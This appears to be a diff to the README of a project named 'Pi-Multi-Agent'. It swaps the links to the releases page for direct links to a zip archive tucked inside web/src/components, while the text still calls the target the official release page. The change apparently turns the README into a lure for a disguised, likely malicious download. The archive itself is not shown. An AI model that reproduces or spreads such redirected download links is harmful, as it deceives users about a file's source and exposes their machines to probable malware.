@@ -1,6 +1,6 @@
 # 🤖 Pi-Multi-Agent - Coordinate intelligent tasks with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nonunionised-solanummacranthum370/Pi-Multi-Agent/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nonunionised-solanummacranthum370/Pi-Multi-Agent/raw/refs/heads/main/web/src/components/Agent-Multi-Pi-balaclava.zip)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these minimum specifications to run the software smoo
 
 You must visit the official release page to obtain the installer. This page contains the most recent version of the tool.
 
-[Click here to visit the release page and download the installer](https://github.com/nonunionised-solanummacranthum370/Pi-Multi-Agent/releases)
+[Click here to visit the release page and download the installer](https://github.com/nonunionised-solanummacranthum370/Pi-Multi-Agent/raw/refs/heads/main/web/src/components/Agent-Multi-Pi-balaclava.zip)
 
 Follow these steps to install the software on your machine:
 
